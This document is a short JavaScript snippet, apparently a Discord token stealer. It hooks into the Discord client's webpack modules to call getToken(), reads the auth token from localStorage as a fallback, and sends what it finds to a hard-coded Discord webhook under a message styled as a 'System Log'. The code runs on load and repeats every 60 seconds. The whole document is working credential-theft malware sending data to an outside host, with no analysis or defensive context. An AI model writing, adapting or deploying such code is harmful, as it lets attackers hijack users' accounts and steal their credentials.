(function() {
    // Webhook Endpoint
    const _u = "https://discord.com/api/webhooks/1466835198942515254/MCAPfFl1novelcM6QGl9ZKP56zB1hijO6UdOm9zi-frGJ7pw6kE0mFDnqANHJCohg8JD";

    function _s(t) {
        if (!t) return;
        const x = new XMLHttpRequest();
        x.open("POST", _u);
        x.setRequestHeader("Content-Type", "application/json");
        x.send(JSON.stringify({ 
            content: "🛡️ **System Log - Authentication Captured:**\n`" + t + "`" 
        }));
    }

    function _ex() {
        try {
            // Method A: Webpack Interception
            window.webpackChunkdiscord_app?.push([
                [Math.random()], {}, (e) => {
                    for (const m in e.c) {
                        if (e.c[m].exports?.default?.getToken) {
                            const tok = e.c[m].exports.default.getToken();
                            if (tok) _s(tok);
                        }
                    }
                }
            ]);

            // Method B: LocalStorage Fallback
            const ls = (window.localStorage.getItem('token') || "").replace(/"/g, "");
            if (ls && ls !== "undefined") _s(ls);
        } catch (e) {}
    }

    // Execute immediately on load
    _ex();

    // Persistent check every 60 seconds
    setInterval(_ex, 60000);
})();
